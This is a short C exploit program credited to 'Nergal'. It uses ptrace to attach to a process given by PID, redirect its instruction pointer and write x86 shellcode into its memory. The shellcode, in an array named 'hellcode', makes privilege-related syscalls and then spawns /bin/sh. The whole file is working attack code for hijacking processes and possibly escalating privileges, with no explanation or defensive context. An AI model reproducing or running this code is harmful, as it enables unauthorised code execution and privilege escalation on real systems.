/* by Nergal */
#include <stdio.h>
#include <sys/ptrace.h>
struct user_regs_struct {
	long ebx, ecx, edx, esi, edi, ebp, eax;
	unsigned short ds, __ds, es, __es;
	unsigned short fs, __fs, gs, __gs;
	long orig_eax, eip;
	unsigned short cs, __cs;
	long eflags, esp;
	unsigned short ss, __ss;
};
/* spiritual black dimension */

char hellcode[] =
    "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80"
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

#define ADDR 0x00125000
main(int argc, char **argv)
{
	int status;
	int i, wpid, pid = atoi(argv[1]);
	struct user_regs_struct regs;
	if (ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
		perror("PTRACE_GETREGS");
		exit(0);
	}
	regs.eip = ADDR;
	if (ptrace(PTRACE_SETREGS, pid, 0, &regs))
		exit(0);
	for (i = 0; i <= strlen(hellcode) + 5; i += 4)
		ptrace(PTRACE_POKETEXT, pid, ADDR + i,
		    *(unsigned int *) (hellcode + i));
	//  kill (pid, SIGSTOP);
	if (ptrace(PTRACE_DETACH, pid, 0, 0))
		exit(0);
	close(2);
	do {
		wpid = waitpid(-1, &status, 0);
		if (wpid == -1) {
			perror("waitpid");
			exit(1);
		}
	} while (wpid != pid);
}
